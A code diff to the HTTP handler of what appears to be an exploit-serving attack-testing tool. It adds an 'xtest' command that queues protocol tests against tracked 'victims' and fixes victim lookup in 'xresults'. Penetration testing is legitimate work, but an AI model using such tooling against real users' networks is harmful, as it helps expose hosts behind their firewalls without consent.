@@ -45,7 +45,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 		page = _page.split("?")[0];
 		if page != "":
 			arrPages = ["exploit.html","exploit.swf","admin.html","gremwell_logo.png","admin.js","admin.css"]
-			arrCommands = ["xclients","xresults"]
+			arrCommands = ["xclients","xresults","xtest"]
 			if page in arrPages:
 				agent = self.get_header(data,"USER-AGENT",":")
 				self.server.log("---" + agent,0)
@@ -64,7 +64,7 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 				elif page=="xresults":
 					page_parts = _page.split("?")
 					if len(page_parts)==2:
-						client = self.server.CALLER.getVictimById(0);#returns None on error
+						client = self.server.CALLER.getVictimById(int(page_parts[1]));#returns None on error
 						if client !=None:
 							for result in client.TESTS:
 								rsltstr ="Failed"
@@ -73,6 +73,19 @@ class HTTPProtoHandler(asyncore.dispatcher_with_send):
 								body = body + result.TEST_TYPE + "|" + result.STATUS + "|" + result.PRIVATE_IP + "|" + result.PRIVATE_PORT + "|" + rsltstr + "|" + result.PUBLIC_PORT + " (" + result.TRANSPORT + ")\n" 
 					else:
 						body=""
+				elif page=="xtest":
+					page_parts = _page.split("?")
+					if len(page_parts)==2:
+						params = page_parts[1].split("&")
+						if len(params)==4:
+							if self.server.CALLER.isValidTestCommand(params[0],params[1],params[2],params[3],False)==True:
+								client = self.server.CALLER.getVictimById(int(params[0]))
+								if params[1].upper() != "ALL":
+									client.addTest(params[1].upper(), params[2], params[3])
+								else:
+									#run all proto tests
+									for xproto in self.ENGINE.PROTOS:
+										client.addTest(xproto, params[2], params[3])	
 				else:
 					body=""
 			else:
